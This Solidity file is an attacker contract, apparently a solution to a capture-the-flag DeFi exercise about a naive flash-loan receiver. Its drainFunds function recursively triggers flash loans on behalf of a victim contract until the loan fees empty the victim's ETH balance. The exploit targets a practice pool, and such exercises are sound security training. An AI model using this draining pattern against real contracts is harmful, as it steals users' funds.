pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    using Address for address payable;

    address payable private pool;

    constructor(address payable poolAddress) {
        pool = poolAddress;
    }

    function drainFunds(address victim) public {
        if (address(victim).balance < 1) {
            return;
        }

        NaiveReceiverLenderPool(pool).flashLoan(victim, address(pool).balance);
        drainFunds(victim);
    }

    // Allow deposits of ETH
    receive () external payable {}
}
